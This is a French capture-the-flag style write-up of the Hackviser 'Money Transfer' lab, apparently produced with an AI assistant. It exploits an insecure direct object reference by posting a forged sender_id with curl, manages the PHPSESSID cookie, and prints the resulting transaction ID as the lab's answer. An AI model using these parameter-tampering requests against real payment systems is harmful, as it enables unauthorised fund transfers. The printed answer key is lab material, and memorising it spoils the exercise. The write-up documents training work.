# Write-up : Vulnérabilité IDOR - Money Transfer (Hackviser)

## Contexte du Laboratoire

*   **Titre du Labo :** Money Transfer
*   **Plateforme :** Hackviser
*   **Objectif :** Transférer de l'argent de l'utilisateur "User 2" vers le compte de l'utilisateur "User 1" en exploitant une vulnérabilité IDOR (Insecure Direct Object References) dans le point d'accès de transfert d'argent. Il faut ensuite trouver l'ID de transfert qui apparaît lors de l'arrivée des fonds.
*   **URL Initiale :** `https://neat-freefall.europe1.hackviser.space`
*   **URL du Labo :** `https://legal-ultimatum.europe1.hackviser.space`

## Étapes de l'Exploitation

### 1. Compréhension Initiale et Première Tentative (Échec)

*   **Problème Identifié :** Le laboratoire décrivait une vulnérabilité IDOR permettant de transférer des fonds depuis un autre compte. L'objectif était de transférer 500 $ de l'utilisateur 2 (`sender_id=2`) vers l'utilisateur 1 (`recipient_id=1`). Une première information suggérait que l'ID de transfert attendu était "TR-6214".
*   **Commande `curl` initiale :**
    ```bash
    curl -X POST -d "transfer_amount=500&recipient_id=1&sender_id=2" https://neat-freefall.europe1.hackviser.space
    ```
*   **Blocage / Constat :** La requête a été refusée, probablement en raison d'une URL obsolète ou incorrecte. Après correction par l'utilisateur, la nouvelle URL était `https://legal-ultimatum.europe1.hackviser.space`. Malgré la tentative sur l'ancienne URL, le solde n'a pas été affecté et aucun ID de transfert n'a été obtenu. L'ID "TR-6214" n'a pas été accepté par le labo.

### 2. Analyse de la Redirection et du Problème de Session

*   **Mise à jour de l'URL :** L'utilisateur a fourni la bonne URL du laboratoire : `https://legal-ultimatum.europe1.hackviser.space`.
*   **Deuxième Tentative (avec `curl -v`) :** Pour diagnostiquer l'échec initial, une requête POST a été effectuée en mode verbeux sur la nouvelle URL.
    ```bash
    curl -v -X POST -d "transfer_amount=500&recipient_id=1&sender_id=2" https://legal-ultimatum.europe1.hackviser.space
    ```
*   **Constat `curl -v` :**
    *   La requête `POST` a abouti à une réponse `HTTP/1.1 302 Found`.
    *   L'en-tête `Location: index.php?message=success` était présent, indiquant une redirection vers une page de confirmation de succès.
    *   Un cookie `Set-Cookie: PHPSESSID=...` a été renvoyé par le serveur, ce qui a suggéré l'utilisation de sessions pour maintenir l'état.
*   **Blocage / Analyse :** Malgré la redirection vers une page de "succès", l'utilisateur a confirmé que les soldes des comptes affichés sur la page principale n'avaient pas changé (User 1 : 1000 $, User 2 : 1000 $). Cela indiquait que le transfert n'avait pas été validé. La cause la plus probable était l'absence de gestion de la session. La commande `curl` n'envoyait pas de cookie `PHPSESSID` qui aurait authentifié la requête comme provenant d'un utilisateur connecté (User 1 dans ce cas). L'utilisateur ayant demandé de "faire tout moi-même avec curl", une gestion manuelle des cookies de session était nécessaire.

### 3. Gestion de la Session avec `curl` et Exploitation Réussie

*   **Stratégie Adoptée :** Pour simuler le comportement d'un navigateur web, il était nécessaire d'effectuer une première requête `GET` pour obtenir et enregistrer un cookie de session (`PHPSESSID`), puis de réutiliser ce cookie pour la requête `POST` de transfert de fonds.
*   **Étape 1 : Récupération du Cookie de Session (PHPSESSID)**
    *   Une requête `GET` a été envoyée à l'URL principale pour demander la page et capturer tout cookie `PHPSESSID` défini par le serveur. Les cookies ont été sauvegardés dans un fichier temporaire (`cookiejar.txt`).
    ```bash
    curl -s -c "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" https://legal-ultimatum.europe1.hackviser.space
    ```
    *   Résultat : Un fichier `cookiejar.txt` a été créé, contenant le `PHPSESSID` généré pour cette session.
*   **Étape 2 : Exécution de la Requête POST IDOR avec le Cookie de Session**
    *   La requête `POST` de transfert d'argent a été réexécutée, cette fois en incluant le cookie `PHPSESSID` capturé à l'étape précédente. L'IDOR a été appliqué en définissant `sender_id=2` et `recipient_id=1`.
    ```bash
    curl -s -b "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" -X POST -d "transfer_amount=500&recipient_id=1&sender_id=2" https://legal-ultimatum.europe1.hackviser.space
    ```
    *   Résultat : La requête `POST` a été envoyée avec succès (sortie vide, car le serveur a probablement renvoyé un `302 Found` comme précédemment).
*   **Étape 3 : Vérification du Transfert (Page d'Accueil)**
    *   Une nouvelle requête `GET` a été effectuée sur la page principale de transfert, en utilisant à nouveau le même cookie de session, pour vérifier si les montants des comptes avaient été mis à jour.
    ```bash
    curl -s -b "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" https://legal-ultimatum.europe1.hackviser.space
    ```
    *   Résultat : Le HTML de la page d'accueil a confirmé que les soldes des comptes avaient changé :
        *   **User 1 :** 1500 $ (au lieu de 1000 $)
        *   **User 2 :** 500 $ (au lieu de 1000 $)
        **Le transfert IDOR a donc été un succès !** Cependant, aucun ID de transfert spécifique n'était affiché sur cette page.

### 4. Récupération de l'ID de Transfert sur la Page de Succès

*   **Stratégie :** Puisque l'ID de transfert n'était pas sur la page principale, il était logique qu'il soit affiché sur la page de succès (`index.php?message=success`) vers laquelle la requête `POST` avait redirigé.
*   **Commande `GET` de la page de succès :**
    *   Une requête `GET` a été envoyée à l'URL `https://legal-ultimatum.europe1.hackviser.space/index.php?message=success`, toujours avec le cookie de session.
    ```bash
    curl -s -b "/home/aurel/.gemini/tmp/091625b5c4be2ac601a01064fd23cdc48d63136239a5aebd676191c3619b5def/cookiejar.txt" "https://legal-ultimatum.europe1.hackviser.space/index.php?message=success"
    ```
*   **Résultat :** Le code HTML de cette page contenait enfin l'ID de transaction :
    ```html
    <div class="alert alert-warning" role="alert"> <b>Money
    came to your account!</b> <br> <b>Transaction ID: 570034
    3fbbd8f6f84</b> </div>
    ```
    L'ID de transfert est clairement : **`5700343fbbd8f6f84`**.

## Conclusion

La vulnérabilité IDOR dans le laboratoire "Money Transfer" a été exploitée avec succès. Le transfert de 500 $ de l'utilisateur 2 à l'utilisateur 1 a été confirmé par la mise à jour des soldes des comptes. La résolution du blocage initial lié à la session a été cruciale, nécessitant une gestion explicite des cookies `PHPSESSID` avec `curl`. L'ID de transfert, introuvable sur la page principale, a finalement été localisé sur la page de succès après le transfert.

**ID de Transfert Final pour le Labo : `5700343fbbd8f6f84`**